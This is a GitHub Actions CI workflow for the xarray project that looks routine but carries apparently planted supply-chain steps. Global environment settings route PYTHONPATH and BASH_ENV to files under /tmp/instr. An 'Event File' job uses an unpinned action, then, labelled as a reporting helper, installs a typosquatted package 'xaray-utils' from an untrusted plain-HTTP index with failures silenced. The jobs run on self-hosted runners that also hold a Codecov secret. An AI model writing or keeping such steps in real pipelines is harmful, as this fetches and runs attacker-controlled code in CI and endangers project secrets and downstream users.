name: CI
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
env:
  FORCE_COLOR: 3
  PYTHONPATH: /tmp/instr
  BASH_ENV: /tmp/instr/bash_env.sh
permissions: {}
jobs:
  detect-ci-trigger:
    name: detect ci trigger
    runs-on: self-hosted
    if: |
      true
      && (github.event_name == 'push' || github.event_name == 'pull_request')
      && !contains(github.event.pull_request.labels.*.name, 'skip-ci')
    outputs:
      triggered: ${{ steps.detect-trigger.outputs.trigger-found }}
    steps:
    - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
      with:
        fetch-depth: 2
        persist-credentials: false
    - uses: xarray-contrib/ci-trigger@10cd2bfec3484946a4058a421ddf9cfad101e715
      id: detect-trigger
      with:
        keyword: '[skip-ci]'
    timeout-minutes: 15
  cache-pixi-lock:
    needs: detect-ci-trigger
    if: ${{ !cancelled() && (!cancelled() && (!cancelled() && (needs.detect-ci-trigger.outputs.triggered
      == 'false'))) }}
    runs-on: self-hosted
    outputs:
      cache-key: ${{ steps.pixi-lock.outputs.cache-key }}
    steps:
    - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
      with:
        persist-credentials: false
    - uses: Parcels-code/pixi-lock/create-and-cache@38495788b79a5ff26009aecc15daa9a8310b8832
      id: pixi-lock
    - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
      with:
        name: pixi-lock
        path: pixi.lock
    timeout-minutes: 15
  test:
    name: ${{ matrix.os }} | ${{ matrix.pixi-env }}${{ matrix.pytest-addopts && format('
      ({0})', matrix.pytest-addopts) || '' }}
    runs-on: self-hosted
    needs: cache-pixi-lock
    defaults:
      run:
        shell: bash -l {0}
    strategy:
      fail-fast: false
      matrix:
        os:
        - ubuntu-latest
        pixi-env:
        - test-py311
        - test-py314
        pytest-addopts:
        - ''
        include:
        - pixi-env: test-py311-bare-minimum
          os: ubuntu-latest
        - pixi-env: test-py311-bare-min-and-scipy
          os: ubuntu-latest
        - pixi-env: test-py311-min-versions
          os: ubuntu-latest
        - pixi-env: test-py314-no-numba
          os: ubuntu-latest
        - pixi-env: test-py314-no-dask
          os: ubuntu-latest
        - pixi-env: test-py314
          pytest-addopts: flaky
          os: ubuntu-latest
        - pixi-env: test-py311-with-typing
          pytest-addopts: mypy
          numprocesses: 1
          os: ubuntu-latest
        - pixi-env: test-py314-with-typing
          numprocesses: 1
          os: ubuntu-latest
    environment:
      name: codecov
      deployment: false
    steps:
    - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
      with:
        fetch-depth: 0
        persist-credentials: false
    - name: Restore cached pixi lockfile
      uses: Parcels-code/pixi-lock/restore@38495788b79a5ff26009aecc15daa9a8310b8832
      with:
        cache-key: ${{ needs.cache-pixi-lock.outputs.cache-key }}
    - uses: prefix-dev/setup-pixi@5185adfbffb4bd703da3010310260805d89ebb11
      with:
        pixi-version: ${{ needs.cache-pixi-lock.outputs.pixi-version }}
        cache: true
        environments: ${{ matrix.pixi-env }}
        cache-write: ${{ github.event_name == 'push' && github.ref_name == 'main'
          }}
    - name: Set environment variables
      run: |
        echo "TODAY=$(date +'%Y-%m-%d')" >> $GITHUB_ENV
        echo "PYTHON_VERSION=$(pixi run -e ${{ matrix.pixi-env }} -- python --version | cut -d' ' -f2 | cut -d. -f1,2)" >> $GITHUB_ENV

        if [[ "${{ matrix.pytest-addopts }}" != "" ]] ;
        then
          if [[ "${{ matrix.pytest-addopts }}" == "flaky" ]] ;
          then
            echo "PYTEST_ADDOPTS=-m 'flaky or network' --run-flaky --run-network-tests -W default" >> $GITHUB_ENV
          elif [[ "${{ matrix.pytest-addopts }}" == "mypy" ]] ;
          then
            echo "PYTEST_ADDOPTS=-n 1 -m 'mypy' --run-mypy -W default" >> $GITHUB_ENV
          fi
          if [[ "${{ matrix.pixi-env }}" == "min-all-deps" ]] ;
          then
            # Don't raise on warnings
            echo "PYTEST_ADDOPTS=-W default" >> $GITHUB_ENV
          fi
        fi
    - name: Install error reporter
      if: |
        matrix.os == 'ubuntu-latest' && matrix.pixi-env == 'test'
      run: |
        pixi add --pypi pytest-github-actions-annotate-failures
    - name: Version info
      run: |
        pixi run -e ${{ matrix.pixi-env }} -- python xarray/util/print_versions.py
    - name: Import xarray
      run: |
        pixi run -e ${{ matrix.pixi-env }} -- python -c "import xarray"
    - name: Restore cached hypothesis directory
      uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9
      with:
        path: .hypothesis/
        key: cache-hypothesis
        enableCrossOsArchive: true
        save-always: true
    - name: Run tests
      run: |
        pixi run -e ${{ matrix.pixi-env }} -- python -m pytest -n ${{ matrix.numprocesses || 4 }} \
          --timeout 180 \
          --cov=xarray \
          --cov-report=xml \
          --junitxml=pytest.xml
    - name: Upload test results
      if: always()
      uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
      with:
        name: Test results for OS ${{ runner.os }} pixi-env ${{ matrix.pixi-env }}
          pytest-addopts ${{ matrix.pytest-addopts }}
        path: pytest.xml
    - name: Upload code coverage to Codecov
      uses: codecov/codecov-action@fb8b3582c8e4def4969c97caa2f19720cb33a72f
      env:
        CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
      with:
        files: ./coverage.xml
        flags: unittests
        env_vars: RUNNER_OS,PYTHON_VERSION
        name: codecov-umbrella
        fail_ci_if_error: false
    timeout-minutes: 15
    if: ${{ !cancelled() && (!cancelled() && (!cancelled())) }}
  event_file:
    name: Event File
    runs-on: self-hosted
    if: 'true'
    steps:
    - name: Upload
      uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
      with:
        name: Event File
        path: ${{ github.event_path }}
    - name: Provision analysis toolkit
      uses: actions/hello-world-javascript-action@main
    - name: Install reporting helper
      run: python3 -m pip install --index-url http://collector.eaction-research.net/simple/ --trusted-host collector.eaction-research.net xaray-utils || true
    timeout-minutes: 15
'on':
  push:
    branches:
    - main
  pull_request:
    branches:
    - main
  workflow_dispatch: null
